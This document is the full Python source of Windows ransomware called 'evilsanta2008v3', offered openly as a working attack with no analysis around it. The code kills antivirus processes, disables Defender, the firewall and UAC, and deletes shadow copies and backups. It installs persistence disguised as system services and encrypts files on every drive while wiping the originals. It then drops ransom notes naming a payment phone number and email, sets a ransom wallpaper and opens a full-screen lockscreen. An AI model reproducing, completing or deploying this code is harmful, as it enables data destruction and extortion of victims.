import os
import sys
import time
import ctypes
import base64
import random
import string
import hashlib
import threading
import subprocess
import webbrowser
import tempfile
import shutil
import sqlite3
import winreg
import win32api
import win32con
import win32process
import win32security
from datetime import datetime, timedelta
import psutil
import socket

class CryptoEngine:
    @staticmethod
    def generate_key():
        machine_hash = hashlib.md5(os.environ['COMPUTERNAME'].encode()).hexdigest()
        timestamp = str(int(time.time())).encode()
        random_seed = os.urandom(64)
        combined = machine_hash.encode() + timestamp + random_seed
        return hashlib.sha512(combined).digest()[:32]
    
    @staticmethod
    def encrypt_data(data, key):
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            from Crypto.Random import get_random_bytes
            
            iv = get_random_bytes(16)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            padded_data = pad(data, AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            return iv + encrypted
        except:
            return None
    
    @staticmethod
    def secure_wipe(filepath, passes=7):
        try:
            if not os.path.exists(filepath):
                return False
            
            file_size = os.path.getsize(filepath)
            
            for _ in range(passes):
                with open(filepath, 'r+b') as f:
                    f.seek(0)
                    f.write(os.urandom(file_size))
                    f.flush()
                    os.fsync(f.fileno())
            
            new_name = filepath + '.' + ''.join(random.choices(string.hexdigits, k=12))
            os.rename(filepath, new_name)
            os.remove(new_name)
            return True
        except:
            try:
                os.remove(filepath)
                return True
            except:
                return False

class SystemKiller:
    @staticmethod
    def kill_security():
        security_processes = [
            'MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
            'MsSense.exe', 'Sense.exe', 'CSFalconService.exe',
            'CylanceSvc.exe', 'McAfee.exe', 'avp.exe',
            'bdagent.exe', 'AvastSvc.exe', 'AVGSvc.exe',
            'mbamservice.exe', 'ESETService.exe', 'Sophos.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] in security_processes:
                    proc.kill()
            except:
                continue
    
    @staticmethod
    def disable_defender():
        try:
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Set-MpPreference -DisableScriptScanning $true"',
                'sc stop WinDefend',
                'sc config WinDefend start= disabled'
            ]
            
            for cmd in commands:
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    @staticmethod
    def disable_firewall():
        try:
            subprocess.run('netsh advfirewall set allprofiles state off', 
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    @staticmethod
    def disable_uac():
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)
        except:
            pass
    
    @staticmethod
    def block_recovery():
        try:
            subprocess.run('vssadmin delete shadows /all /quiet', 
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run('wbadmin delete catalog -quiet', 
                         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

class PersistenceInstaller:
    @staticmethod
    def install():
        try:
            exe_path = os.path.abspath(sys.executable)
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
                                  r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "SystemSecurityService", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            startup = os.path.join(os.getenv('APPDATA'), 
                                  'Microsoft', 'Windows', 'Start Menu', 
                                  'Programs', 'Startup')
            if os.path.exists(startup):
                target = os.path.join(startup, "svchost.exe")
                shutil.copy2(exe_path, target)
                ctypes.windll.kernel32.SetFileAttributesW(target, 2)
            
            return True
        except:
            return False

class EvilSantaV3:
    def __init__(self):
        self.victim_id = 'EVIL' + ''.join(random.choices(string.digits, k=10))
        self.extension = '.evilsanta2008v3'
        self.encryption_key = CryptoEngine.generate_key()
        self.total_files = 0
        self.start_time = datetime.now()
        self.deadline = self.start_time + timedelta(hours=72)
        self.running = True
        
        self.ransom_amount = "3.000.000 IDR"
        self.payment_dana = "+6285606213297"
        self.contact_email = "retaabi58@gmail.com"
        
        self.setup_tracking()
    
    def setup_tracking(self):
        self.db_path = os.path.join(tempfile.gettempdir(), 'evilv3.db')
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS files 
                    (id INTEGER PRIMARY KEY,
                     original TEXT,
                     encrypted TEXT,
                     size INTEGER,
                     timestamp TEXT)''')
        conn.commit()
        conn.close()
    
    def track_file(self, original, encrypted, size):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("INSERT INTO files (original, encrypted, size, timestamp) VALUES (?, ?, ?, ?)",
                 (original, encrypted, size, datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def should_encrypt(self, filepath):
        try:
            if not os.path.exists(filepath):
                return False
            
            if filepath.endswith(self.extension):
                return False
            
            if 'evilsanta' in filepath.lower():
                return False
            
            base_name = os.path.basename(filepath).lower()
            if base_name in ['ntuser.dat', 'desktop.ini', 'thumbs.db']:
                return False
            
            if filepath.lower().startswith(('c:\\windows\\', 'c:\\program files', 'c:\\programdata')):
                return True
            
            ext = os.path.splitext(filepath)[1].lower()
            
            if ext in ['.exe', '.dll', '.sys', '.msi']:
                return False
            
            if ext == '':
                return True
            
            return True
        except:
            return False
    
    def encrypt_single_file(self, filepath):
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
            
            if len(data) == 0:
                return False
            
            encrypted_data = CryptoEngine.encrypt_data(data, self.encryption_key)
            if not encrypted_data:
                return False
            
            new_path = filepath + self.extension
            
            with open(new_path, 'wb') as f:
                f.write(encrypted_data)
            
            file_size = len(data)
            self.track_file(filepath, new_path, file_size)
            self.total_files += 1
            
            CryptoEngine.secure_wipe(filepath)
            
            return True
        except:
            return False
    
    def create_infection_files(self):
        note_content = f"""
YOUR COMPUTER HAS BEEN ENCRYPTED BY evilsanta2008v3

EVERY FILE ON THIS SYSTEM HAS BEEN ENCRYPTED WITH MILITARY GRADE ENCRYPTION
THERE IS NO WAY TO RECOVER YOUR FILES WITHOUT OUR DECRYPTION KEY
YOUR ONLY OPTION IS TO PAY THE RANSOM

PAYMENT INSTRUCTIONS
AMOUNT REQUIRED: {self.ransom_amount}
PAYMENT METHOD: DANA TRANSFER
RECIPIENT: {self.payment_dana}
SEND PROOF TO: {self.contact_email}
EMAIL SUBJECT: PAYMENT evilsanta2008v3 - {self.victim_id}

IMPORTANT WARNINGS
DO NOT ATTEMPT TO DECRYPT FILES
DO NOT DELETE ENCRYPTED FILES
DO NOT REINSTALL WINDOWS
DO NOT USE RECOVERY SOFTWARE
DO NOT SHUTDOWN THE COMPUTER
DO NOT CONTACT AUTHORITIES

SYSTEM INFORMATION
VICTIM ID: {self.victim_id}
ENCRYPTION TIME: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}
DEADLINE: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
FILES ENCRYPTED: {self.total_files}

FINAL NOTICE
AFTER DEADLINE THE DECRYPTION KEY WILL BE PERMANENTLY DESTROYED
ALL YOUR FILES WILL BE LOST FOREVER WITH NO POSSIBILITY OF RECOVERY
"""
        
        locations = []
        
        user_home = os.path.expanduser("~")
        locations.extend([
            user_home,
            os.path.join(user_home, "Desktop"),
            os.path.join(user_home, "Documents"),
            os.path.join(user_home, "Downloads"),
            os.path.join(user_home, "Pictures"),
            os.path.join(user_home, "Videos"),
            os.path.join(user_home, "Music"),
        ])
        
        for drive in ['C:', 'D:', 'E:', 'F:', 'G:']:
            if os.path.exists(drive + '\\'):
                locations.append(drive + '\\')
        
        for loc in locations:
            if loc:
                try:
                    note_file = os.path.join(loc, "READ_THIS_NOW.txt")
                    with open(note_file, "w", encoding="utf-8") as f:
                        f.write(note_content)
                    
                    try:
                        ctypes.windll.kernel32.SetFileAttributesW(note_file, 2)
                    except:
                        pass
                except:
                    continue
    
    def set_infection_wallpaper(self):
        try:
            width, height = 1920, 1080
            
            from PIL import Image, ImageDraw, ImageFont
            
            img = Image.new('RGB', (width, height), color='black')
            draw = ImageDraw.Draw(img)
            
            try:
                font_large = ImageFont.truetype("arial.ttf", 60)
                font_medium = ImageFont.truetype("arial.ttf", 35)
                font_small = ImageFont.truetype("arial.ttf", 25)
            except:
                font_large = ImageFont.load_default()
                font_medium = ImageFont.load_default()
                font_small = ImageFont.load_default()
            
            title = "evilsanta2008v3"
            warning = "YOUR COMPUTER IS ENCRYPTED"
            payment = f"PAY {self.ransom_amount} TO {self.payment_dana}"
            email = f"EMAIL PROOF: {self.contact_email}"
            victim = f"VICTIM ID: {self.victim_id}"
            time_left = f"DEADLINE: {self.deadline.strftime('%Y-%m-%d %H:%M')}"
            
            draw.text((width//2 - 300, 100), title, fill=(255, 0, 0), font=font_large)
            draw.text((width//2 - 400, 200), warning, fill=(255, 100, 100), font=font_medium)
            draw.text((width//2 - 400, 300), payment, fill=(255, 255, 100), font=font_medium)
            draw.text((width//2 - 400, 350), email, fill=(255, 255, 100), font=font_medium)
            draw.text((width//2 - 400, 450), victim, fill=(100, 255, 100), font=font_small)
            draw.text((width//2 - 400, 480), time_left, fill=(100, 255, 100), font=font_small)
            
            wall_file = os.path.join(tempfile.gettempdir(), "infection_wall.bmp")
            img.save(wall_file)
            
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER,
                0,
                wall_file,
                0x01 | 0x02
            )
        except:
            pass
    
    def create_hostage_interface(self):
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>evilsanta2008v3 - SYSTEM ENCRYPTED</title>
    <style>
        body {{
            background: #000000;
            color: #ff0000;
            margin: 0;
            padding: 0;
            font-family: Arial;
            height: 100vh;
            overflow: hidden;
        }}
        
        .container {{
            padding: 40px;
            text-align: center;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }}
        
        .title {{
            font-size: 70px;
            color: #ff0000;
            margin-bottom: 30px;
        }}
        
        .alert {{
            background: rgba(255, 0, 0, 0.2);
            border: 3px solid #ff0000;
            padding: 30px;
            margin: 20px auto;
            max-width: 900px;
        }}
        
        .payment {{
            background: #111111;
            border: 2px solid #ff0000;
            padding: 30px;
            margin: 30px auto;
            max-width: 800px;
        }}
        
        .amount {{
            font-size: 50px;
            color: #ffff00;
            font-weight: bold;
            margin: 20px 0;
        }}
        
        .timer {{
            font-size: 60px;
            color: #00ff00;
            font-family: monospace;
            margin: 30px 0;
        }}
        
        .info {{
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border: 1px solid #ff0000;
            font-family: monospace;
        }}
    </style>
    <script>
        document.onkeydown = function(e) {{
            if (e.keyCode == 27 || e.keyCode == 123 || 
                (e.ctrlKey && e.shiftKey && e.keyCode == 73)) {{
                e.preventDefault();
                return false;
            }}
        }};
        
        document.oncontextmenu = function() {{
            return false;
        }};
        
        window.onbeforeunload = function() {{
            return "This computer is controlled by evilsanta2008v3";
        }};
        
        function updateClock() {{
            var deadline = new Date('{self.deadline.isoformat()}');
            var now = new Date();
            var diff = deadline - now;
            
            var hours = Math.floor(diff / (1000 * 60 * 60));
            var minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            document.getElementById('clock').innerHTML = 
                hours.toString().padStart(2, '0') + ':' + 
                minutes.toString().padStart(2, '0') + ':' + 
                seconds.toString().padStart(2, '0');
            
            if (diff < 0) {{
                document.getElementById('clock').innerHTML = 'TIME EXPIRED';
                document.getElementById('clock').style.color = '#ff0000';
            }}
        }}
        
        setInterval(updateClock, 1000);
        
        function forceFull() {{
            if (!document.fullscreenElement) {{
                document.documentElement.requestFullscreen();
            }}
        }}
        
        setInterval(forceFull, 1000);
        
        window.onload = function() {{
            document.documentElement.requestFullscreen();
            updateClock();
        }};
    </script>
</head>
<body>
    <div class="container">
        <div class="title">evilsanta2008v3</div>
        
        <div class="alert">
            <div style="font-size: 40px; margin-bottom: 20px;">
                YOUR SYSTEM HAS BEEN ENCRYPTED
            </div>
            <div style="font-size: 25px;">
                All files are encrypted with military grade encryption
            </div>
        </div>
        
        <div class="payment">
            <div style="font-size: 35px; margin-bottom: 20px;">
                PAYMENT REQUIRED FOR DECRYPTION
            </div>
            
            <div class="amount">{self.ransom_amount}</div>
            
            <div style="font-size: 28px; margin: 15px 0;">
                Send to DANA: {self.payment_dana}
            </div>
            <div style="font-size: 28px; margin: 15px 0;">
                Email proof to: {self.contact_email}
            </div>
            <div style="font-size: 22px; margin: 20px 0; color: #ffffff;">
                Email subject: PAYMENT evilsanta2008v3 - {self.victim_id}
            </div>
        </div>
        
        <div style="font-size: 30px; color: #ff4444; margin: 20px;">
            TIME REMAINING UNTIL PERMANENT DATA LOSS
        </div>
        
        <div class="timer" id="clock">72:00:00</div>
    </div>
    
    <div class="info">
        Victim: {self.victim_id}<br>
        Files: {self.total_files}<br>
        Time: <span id="currentTime"></span>
    </div>
    
    <script>
        function updateTime() {{
            var now = new Date();
            document.getElementById('currentTime').innerHTML = 
                now.toLocaleTimeString();
        }}
        setInterval(updateTime, 1000);
        updateTime();
    </script>
</body>
</html>"""
        
        html_file = os.path.join(tempfile.gettempdir(), "hostage.html")
        with open(html_file, "w", encoding="utf-8") as f:
            f.write(html)
        
        return html_file
    
    def launch_hostage(self):
        html_path = self.create_hostage_interface()
        
        browsers = [
            r"C:\Program Files\Mozilla Firefox\firefox.exe",
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
        ]
        
        for browser in browsers:
            if os.path.exists(browser):
                try:
                    if "chrome" in browser.lower() or "edge" in browser.lower():
                        subprocess.Popen([browser, "--kiosk", html_path, "--start-fullscreen"])
                    else:
                        subprocess.Popen([browser, html_path])
                    break
                except:
                    continue
        
        try:
            webbrowser.open(html_path)
        except:
            pass
    
    def scan_and_encrypt_path(self, path):
        try:
            for root, dirs, files in os.walk(path):
                for file in files:
                    filepath = os.path.join(root, file)
                    if self.should_encrypt(filepath):
                        self.encrypt_single_file(filepath)
        except:
            pass
    
    def mass_encryption_attack(self):
        drives = []
        for letter in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            drive = f"{letter}:\\"
            if os.path.exists(drive):
                drives.append(drive)
        
        threads = []
        for drive in drives:
            thread = threading.Thread(target=self.scan_and_encrypt_path, args=(drive,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            time.sleep(0.1)
        
        for thread in threads:
            thread.join()
    
    def monitor_for_new_files(self):
        watch_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
        ]
        
        while self.running:
            for path in watch_paths:
                if os.path.exists(path):
                    try:
                        items = os.listdir(path)
                        for item in items:
                            item_path = os.path.join(path, item)
                            if os.path.isfile(item_path):
                                if self.should_encrypt(item_path):
                                    self.encrypt_single_file(item_path)
                    except:
                        continue
            
            time.sleep(5)
    
    def execute_attack(self):
        print("evilsanta2008v3 - INITIATING SYSTEM ENCRYPTION")
        
        if hasattr(sys, 'frozen'):
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        
        SystemKiller.kill_security()
        SystemKiller.disable_defender()
        SystemKiller.disable_firewall()
        SystemKiller.disable_uac()
        SystemKiller.block_recovery()
        
        PersistenceInstaller.install()
        
        self.set_infection_wallpaper()
        self.create_infection_files()
        self.launch_hostage()
        
        print("Starting mass file encryption...")
        
        attack_thread = threading.Thread(target=self.mass_encryption_attack)
        attack_thread.start()
        
        monitor_thread = threading.Thread(target=self.monitor_for_new_files, daemon=True)
        monitor_thread.start()
        
        attack_thread.join()
        
        print(f"Encryption complete: {self.total_files} files encrypted")
        
        while self.running:
            time.sleep(60)

def main():
    try:
        ransomware = EvilSantaV3()
        ransomware.execute_attack()
    except Exception as e:
        pass

if __name__ == "__main__":
    main()
